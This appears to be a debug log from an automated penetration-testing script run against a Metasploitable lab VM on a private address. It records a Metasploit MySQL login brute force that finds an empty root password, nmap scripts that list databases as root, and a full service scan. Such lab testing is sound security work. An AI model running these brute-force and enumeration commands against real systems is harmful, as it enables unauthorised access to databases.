+2017-02-06 16:49:29,269 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/mysql/mysql_login\n', 'use auxiliary/scanner/mysql/mysql_login\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set rport 3306\n', 'set rport 3306\r\r\n\x1b[0mrport => 3306\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set  USERPASS_FILE Scripts/password.txt\n', 'set  USERPASS_FILE Scripts/password.txt\r\r\n\x1b[0mUSERPASS_FILE => Scripts/password.txt\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set  USER_FILE Scripts/users.txt\n', 'set  USER_FILE Scripts/users.txt\r\r\n\x1b[0mUSER_FILE => Scripts/users.txt\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set threads 10\n', 'set threads 10\r\r\n\x1b[0mthreads => 10\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', '>run', "run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jame: (Incorrect: Access denied for user 'jame'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jill: (Incorrect: Access denied for user 'jill'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: khan: (Incorrect: Access denied for user 'khan'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[32m[+]\x1b[0m 192.168.182.128:3306  - MYSQL - Success: 'root:'\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: toor: (Incorrect: Access denied for user 'toor'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin: (Incorrect: Access denied for user 'admin'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msfadmin: (Incorrect: Access denied for user 'msfadmin'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msf: (Incorrect: Access denied for user 'msf'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin@123: (Incorrect: Access denied for user 'admin@123'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: abc: (Incorrect: Access denied for user 'abc'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal123: (Incorrect: Access denied for user 'pal123'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal@123: (Incorrect: Access denied for user 'pal@123'@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: : (Incorrect: Access denied for user ''@'192.168.182.1' (using password: NO))\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n"]
+2017-02-06 16:49:29,269 - Commands Logger - DEBUG - My var : '$.Entries."mysql_5"'
+2017-02-06 16:49:29,269 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jame: (Incorrect: Access denied for user 'jame'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jill: (Incorrect: Access denied for user 'jill'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: khan: (Incorrect: Access denied for user 'khan'@'192.168.182.1' (using password: NO))
+[1m[32m[+][0m 192.168.182.128:3306  - MYSQL - Success: 'root:'
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: toor: (Incorrect: Access denied for user 'toor'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin: (Incorrect: Access denied for user 'admin'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msfadmin: (Incorrect: Access denied for user 'msfadmin'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msf: (Incorrect: Access denied for user 'msf'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin@123: (Incorrect: Access denied for user 'admin@123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: abc: (Incorrect: Access denied for user 'abc'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal123: (Incorrect: Access denied for user 'pal123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal@123: (Incorrect: Access denied for user 'pal@123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: : (Incorrect: Access denied for user ''@'192.168.182.1' (using password: NO))
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:29,346 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:49:29,383 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_6  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:49:29,384 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_6  Message --> :Thread started --with command nmap --script mysql-query --script-args='query="show databases;",username=root' -p 3306 192.168.182.128
+2017-02-06 16:49:36,630 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_6  Message --> :Thread finished
+2017-02-06 16:49:36,631 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_6  Message --> :Saving details :
+2017-02-06 16:49:36,632 - Commands Logger - DEBUG - Command id is ->mysql_6
+2017-02-06 16:49:36,632 - Commands Logger - DEBUG - commands are : [u'nmap --script mysql-query --script-args=\'query="show databases;",username=root\' -p 3306 192.168.182.128', '\nEnd']
+2017-02-06 16:49:36,633 - Commands Logger - DEBUG - My var : '$.Entries."mysql_6"'
+2017-02-06 16:49:36,633 - Commands Logger - DEBUG - Result --> : Command Executed :nmap --script mysql-query --script-args='query="show databases;",username=root' -p 3306 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:49 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00075s latency).
+PORT     STATE SERVICE
+3306/tcp open  mysql
+| mysql-query: 
+|   Database
+|   information_schema
+|   dvwa
+|   metasploit
+|   mysql
+|   owasp10
+|   tikiwiki
+|   tikiwiki195
+|   
+|   Query: show databases;
+|_  User: root
+
+Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds
+
+
+
+2017-02-06 16:49:36,649 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:49:36,692 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_7  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:49:36,693 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_7  Message --> :Thread started --with command nmap -sV -sC -p 3306 192.168.182.128
+2017-02-06 16:49:46,513 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_7  Message --> :Thread finished
+2017-02-06 16:49:46,514 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_7  Message --> :Saving details :
+2017-02-06 16:49:46,516 - Commands Logger - DEBUG - Command id is ->mysql_7
+2017-02-06 16:49:46,517 - Commands Logger - DEBUG - commands are : [u'nmap -sV -sC -p 3306 192.168.182.128', '\nEnd']
+2017-02-06 16:49:46,517 - Commands Logger - DEBUG - My var : '$.Entries."mysql_7"'
+2017-02-06 16:49:46,517 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -sV -sC -p 3306 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:49 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00066s latency).
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 67
+|   Capabilities flags: 43564
+|   Some Capabilities: SupportsCompression, Support41Auth, ConnectWithDatabase, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, LongColumnFlag, SupportsTransactions
+|   Status: Autocommit
+|_  Salt: 6E5{-iK{I=4,!]3'eK($
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
+
+
+
+2017-02-06 16:49:46,624 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:49:46,685 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_8  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:49:46,686 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_8  Message --> :Thread started --with command nmap -sV --script=mysql-info.nse -p 3306 192.168.182.128
+2017-02-06 16:49:54,944 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_8  Message --> :Thread finished
+2017-02-06 16:49:54,945 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_8  Message --> :Saving details :
+2017-02-06 16:49:54,949 - Commands Logger - DEBUG - Command id is ->mysql_8
+2017-02-06 16:49:54,949 - Commands Logger - DEBUG - commands are : [u'nmap -sV --script=mysql-info.nse -p 3306 192.168.182.128', '\nEnd']
+2017-02-06 16:49:54,949 - Commands Logger - DEBUG - My var : '$.Entries."mysql_8"'
+2017-02-06 16:49:54,949 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -sV --script=mysql-info.nse -p 3306 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:49 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.00082s latency).
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 70
+|   Capabilities flags: 43564
+|   Some Capabilities: SupportsCompression, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, Support41Auth, ConnectWithDatabase, SupportsTransactions, LongColumnFlag
+|   Status: Autocommit
+|_  Salt: ^yen{=\8C':-pqc}l%n|
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
+
+
+
+2017-02-06 16:49:54,962 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:49:55,035 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_9  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:49:55,036 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_9  Message --> :Thread started --with command nmap --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.168.182.128
+2017-02-06 16:50:02,428 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_9  Message --> :Thread finished
+2017-02-06 16:50:02,429 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_9  Message --> :Saving details :
+2017-02-06 16:50:02,431 - Commands Logger - DEBUG - Command id is ->mysql_9
+2017-02-06 16:50:02,431 - Commands Logger - DEBUG - commands are : [u'nmap --script mysql-audit --script-args "mysql-audit.username=\'root\',mysql-audit.filename=\'/usr/share/nmap/nselib/data/mysql-cis.audit\'" -p 3306 192.168.182.128', '\nEnd']
+2017-02-06 16:50:02,431 - Commands Logger - DEBUG - My var : '$.Entries."mysql_9"'
+2017-02-06 16:50:02,431 - Commands Logger - DEBUG - Result --> : Command Executed :nmap --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:49 UTC
+Nmap scan report for 192.168.182.128
+Host is up (0.0019s latency).
+PORT     STATE SERVICE
+3306/tcp open  mysql
+|_mysql-audit: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
+
+
+
+2017-02-06 16:50:02,446 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:50:02,520 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_10  Message --> :In method SingleLineCommands_Timeout()
+2017-02-06 16:50:02,521 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_10  Message --> :Thread started --with command nmap -sV --script=mysql-databases --script-args'=mysqluser= root' 192.168.182.128
+2017-02-06 16:50:33,053 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_10  Message --> :Thread finished
+2017-02-06 16:50:33,053 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_10  Message --> :Saving details :
+2017-02-06 16:50:33,057 - Commands Logger - DEBUG - Command id is ->mysql_10
+2017-02-06 16:50:33,057 - Commands Logger - DEBUG - commands are : [u"nmap -sV --script=mysql-databases --script-args'=mysqluser= root' 192.168.182.128", '\nEnd']
+2017-02-06 16:50:33,057 - Commands Logger - DEBUG - My var : '$.Entries."mysql_10"'
+2017-02-06 16:50:33,057 - Commands Logger - DEBUG - Result --> : Command Executed :nmap -sV --script=mysql-databases --script-args'=mysqluser= root' 192.168.182.128
+
+Result
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-02-06 16:50 UTC
+Nmap scan report for 192.168.182.128
+Host is up (1.0s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      46785/tcp  mountd
+|   100005  1,2,3      51740/udp  mountd
+|   100021  1,3,4      41320/udp  nlockmgr
+|   100021  1,3,4      51227/tcp  nlockmgr
+|   100024  1          35506/tcp  status
+|_  100024  1          37594/udp  status
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  tcpwrapped
+1099/tcp open  rmiregistry GNU Classpath grmiregistry
+1524/tcp open  shell       Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+| mysql-databases: 
+|   information_schema
+|   dvwa
+|   metasploit
+|   mysql
+|   owasp10
+|   tikiwiki
+|_  tikiwiki195
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         Unreal ircd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-server-header: Apache-Coyote/1.1
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port513-TCP:V=7.12%I=7%D=2/6%Time=5898A94E%P=x86_64-pc-linux-gnu%r(DNSS
+SF:tatusRequest,1,"\x01")%r(SMBProgNeg,1,"\x01")%r(afp,1,"\x01");
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.50 seconds
+
+
+
+2017-02-06 16:50:33,163 - Commands Logger - DEBUG - Finished!!!
